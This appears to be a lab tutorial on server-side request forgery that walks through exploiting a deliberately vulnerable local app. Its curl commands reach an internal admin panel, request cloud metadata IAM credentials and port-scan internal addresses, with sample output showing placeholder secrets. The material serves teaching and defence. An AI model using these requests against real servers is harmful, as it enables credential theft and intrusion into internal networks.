## Server-Side Request Forgery (SSRF)

### What is it?
SSRF occurs when an application fetches a URL provided by the user without validating it. The server acts as a proxy, allowing the attacker to:
- Access internal services (databases, admin panels, Redis)
- Steal **cloud instance credentials** (AWS/GCP/Azure metadata API)
- Port-scan internal networks
- Bypass firewalls

**Real-world impact:**
- **Capital One Breach (2019)**: SSRF was used to access AWS metadata and steal 100M+ customer records
- **GitLab SSRF (CVE-2021-22214)**: Allowed accessing internal services

### Prerequisites
Install httpx and start the vulnerable server:

```Bash
pip install httpx
uvicorn vulnerable:app --reload
```

### Exploitation Steps

**1. Test Normal Functionality**

```Bash
curl "http://127.0.0.1:8000/api/fetch-url?url=https://httpbin.org/get"
```

The server fetches the URL and returns the content. This works as intended.

**2. Access Internal Admin Panel (SSRF)**

The attacker uses the server to access an internal endpoint that should NOT be publicly reachable:

```Bash
curl "http://127.0.0.1:8000/api/fetch-url?url=http://127.0.0.1:8000/internal/admin"
```

Expected Response:
```
Status: 200

INTERNAL ADMIN PANEL
Database: postgres://admin:s3cret@10.0.1.5/prod
API Key: sk_live_supersecretkey123
```

The attacker accessed the internal admin panel through the SSRF, leaking database credentials and API keys!

**3. Steal Cloud Credentials (AWS Metadata)**

In a real cloud environment (AWS EC2), the attacker would request:

```Bash
curl "http://127.0.0.1:8000/api/fetch-url?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

This returns IAM role credentials, giving the attacker access to AWS resources (S3 buckets, databases, etc.).

**4. Port Scan Internal Network**

The attacker can discover internal services:

```Bash
# Scan for common ports on internal IPs
for port in 6379 5432 3306 8080 9200; do
  echo "Port $port:"
  curl -s --max-time 2 "http://127.0.0.1:8000/api/fetch-url?url=http://10.0.1.5:$port"
  echo ""
done
```

**5. SSRF via Webhook**

```Bash
curl "http://127.0.0.1:8000/api/webhook-test?callback_url=http://127.0.0.1:8000/internal/admin"
```

**Result:** The server makes requests on behalf of the attacker, bypassing all network-level access controls. The fix requires URL validation with domain allowlists, IP range blocking, and disabling redirect following.
